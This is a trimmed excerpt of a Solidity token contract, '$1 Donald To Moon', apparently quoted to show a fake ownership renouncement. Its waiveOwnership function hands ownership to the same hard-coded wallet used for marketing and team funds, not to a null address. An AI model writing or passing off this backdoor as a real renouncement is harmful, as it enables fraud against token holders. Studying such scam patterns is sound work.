...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x610De8219a6c392A95b498E853C12F0Df675D1b1);
    }
...
contract $1DonaldToMoon is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "$1 Donald To Moon";
    string private _symbol = "DONALD$1";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x610De8219a6c392A95b498E853C12F0Df675D1b1);
    address payable public teamWalletAddress = payable(0x610De8219a6c392A95b498E853C12F0Df675D1b1);
